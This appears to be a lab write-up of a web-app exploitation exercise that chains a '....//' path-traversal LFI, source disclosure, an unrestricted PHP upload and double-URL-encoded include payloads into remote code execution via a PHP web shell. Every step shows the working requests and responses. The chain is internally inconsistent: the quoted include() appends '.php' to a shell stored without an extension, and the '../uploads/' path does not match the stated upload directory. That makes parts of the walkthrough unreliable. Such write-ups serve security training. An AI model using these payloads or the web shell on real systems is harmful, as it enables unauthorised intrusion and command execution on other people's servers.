# File Inclusion — Skills Assessment

| Field | Details |
|-------|---------|
| Module | 20 — File Inclusion |
| Type | Skills Assessment |
| Difficulty | Medium |
| Target | `10.129.43.173:48753` |
| Attacker | `10.10.16.36` |
| Date | September 2026 |

---

## Objective

> Assess the web application and use a variety of techniques to gain remote code execution, then find a flag in the `/` root directory of the file system.

---

## Attack Chain Overview

1. Discover LFI in `/api/image.php` via `p` parameter — `....//` bypass (non-recursive `str_replace`)
2. Read source code of `contact.php` via LFI — find `region` parameter with character blacklist
3. Read source code of `/api/apply.php` via LFI — discover upload directory and MD5 filename scheme
4. Create PHP web shell, compute MD5 hash to predict server-side filename
5. Upload `.php` shell via `apply.php` (no extension validation)
6. Access shell via `region` parameter using double URL-encoding to bypass blacklist
7. Execute commands → retrieve flag from `/` root

---

## Step 1 — Discover LFI via `str_replace` Bypass

Navigate to `http://10.129.43.173:48753`. Page images load from the `/api/image.php` endpoint using a `p` parameter with an MD5 hash value.

**Enable image capture in Burp Suite:**
`Proxy → HTTP History → Filter settings → Filter by MIME type → tick Images`

Refresh the page, capture an image request, send it to Repeater (`Ctrl+R`).

Replace the `p` parameter value with traversal payloads. Basic `../../../../etc/passwd` is blocked. The `....//` pattern succeeds — the application uses a non-recursive `str_replace("../", "")`, so `....//` reconstructs to `../` after the filter runs.

```http
GET /api/image.php?p=....//....//....//....//etc/passwd HTTP/1.1
Host: 10.129.43.173:48753
User-Agent: Mozilla/5.0
```

**Response (truncated):**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www/html:/usr/sbin/nologin
```

LFI confirmed.

---

## Step 2 — Source Disclosure — `contact.php`

Use LFI to read the source of PHP files in the web root.

```http
GET /api/image.php?p=....//....//....//....//var/www/html/contact.php HTTP/1.1
Host: 10.129.43.173:48753
```

**Key finding — `region` parameter logic:**

```php
if (isset($_GET['region'])) {
    $region = $_GET['region'];
    if (preg_match('/[.\/]/', $region)) {
        die("Invalid region!");
    }
    $region = urldecode($region);
    include("./regions/" . $region . ".php");
}
```

The `region` parameter:
- Rejects any value containing `.` or `/`
- URL-decodes the value **once** before passing it to `include()`
- Vulnerable to **double URL-encoding** — the filter sees encoded bytes, not raw dots/slashes

---

## Step 3 — Source Disclosure — `/api/apply.php`

The `apply.php` page offers file upload. Read the handler to understand storage logic:

```http
GET /api/image.php?p=....//....//....//....//var/www/html/api/apply.php HTTP/1.1
Host: 10.129.43.173:48753
```

**Key findings:**

```php
$uploadDir = $_SERVER['DOCUMENT_ROOT'] . '/uploads/';
$fileName = md5_file($_FILES['file']['tmp_name']);
move_uploaded_file($_FILES['file']['tmp_name'], $uploadDir . $fileName);
```

- Files saved to `/uploads/` (web-accessible)
- Filename = `md5_file()` hash of the file contents — **predictable**
- **No extension validation** — `.php` files accepted

---

## Step 4 — Create Web Shell and Calculate Filename

```bash
Hackerpatel007_1@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
Hackerpatel007_1@htb[/htb]$ md5sum shell.php
fc023fcacb27a7ad72d605c4e300b389  shell.php
```

Server-side filename will be: `fc023fcacb27a7ad72d605c4e300b389` (no extension)

---

## Step 5 — Upload PHP Web Shell

Upload `shell.php` via the file upload form at `http://10.129.43.173:48753/apply.php`.

```http
POST /api/apply.php HTTP/1.1
Host: 10.129.43.173:48753
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/octet-stream

<?php system($_GET["cmd"]); ?>
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

No extension validation — upload succeeds. Shell is now at `/uploads/fc023fcacb27a7ad72d605c4e300b389`.

---

## Step 6 — Bypass Character Blacklist via Double URL-Encoding

The `region` parameter blocks `.` and `/`. Single URL-encoding (`%2E`, `%2F`) is decoded before the filter check — still blocked. Double URL-encoding bypasses it:

| Character | Single Encode | Double Encode |
|-----------|--------------|---------------|
| `.` | `%2E` | `%252E` |
| `/` | `%2F` | `%252F` |

**Bypass flow:**
1. Request arrives: `%252E%252E%252Fuploads%252Ffc023fcacb27a7ad72d605c4e300b389`
2. Web framework decodes once → `%2E%2E%2Fuploads%2Ffc023fcacb27a7ad72d605c4e300b389`
3. `preg_match('/[.\/]/', ...)` sees no literal `.` or `/` → **passes**
4. `urldecode()` decodes again → `../uploads/fc023fcacb27a7ad72d605c4e300b389`
5. `include()` executes the shell

**Test RCE with `id`:**

```http
GET /contact.php?region=%252E%252E%252Fuploads%252Ffc023fcacb27a7ad72d605c4e300b389&cmd=id HTTP/1.1
Host: 10.129.43.173:48753
```

**Response:**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

RCE confirmed.

---

## Step 7 — Retrieve Flag

```http
GET /contact.php?region=%252E%252E%252Fuploads%252Ffc023fcacb27a7ad72d605c4e300b389&cmd=cat+/*.txt HTTP/1.1
Host: 10.129.43.173:48753
```

**Response:**
```
HTB{flag_redacted}
```

> **Flag:** `HTB{flag_redacted}`

---

## Attack Chain Summary

```
LFI (....// bypass)
  → Source Disclosure: contact.php (region parameter + character blacklist)
  → Source Disclosure: apply.php (upload dir + md5_file naming)
  → File Upload (no ext validation, .php accepted)
  → Double URL-Encoding bypass
  → LFI + Upload chain → RCE
  → Flag in / root directory
```

---

## Vulnerability Analysis

| Vulnerability | Root Cause | Impact |
|---------------|-----------|--------|
| LFI (`str_replace` bypass) | Non-recursive strip of `../` allows `....//` reconstruction | Arbitrary file read |
| Character blacklist bypass | Single URL-decode before check allows double-encoding | Filter bypass |
| Unrestricted file upload | No extension or MIME validation | Arbitrary `.php` upload |
| Predictable filename | `md5_file()` output is deterministic | Attacker can compute upload path |
| Upload + LFI chain | Upload directory is web-accessible + LFI allows inclusion | Full RCE |

---

## MITRE ATT&CK Mapping

| ID | Technique | Usage |
|----|-----------|-------|
| T1190 | Exploit Public-Facing Application | LFI in `/api/image.php` |
| T1083 | File and Directory Discovery | Source disclosure of `contact.php` and `apply.php` |
| T1059.004 | Command and Scripting Interpreter: Unix Shell | PHP `system()` executing OS commands |
| T1505.003 | Server Software Component: Web Shell | PHP web shell uploaded to `/uploads/` |
| T1027 | Obfuscated Files or Information | Double URL-encoding to bypass character blacklist |
| T1552.001 | Unsecured Credentials: Credentials in Files | Reading `/etc/passwd` via LFI |
| T1005 | Data from Local System | Flag retrieved from `/` root directory |
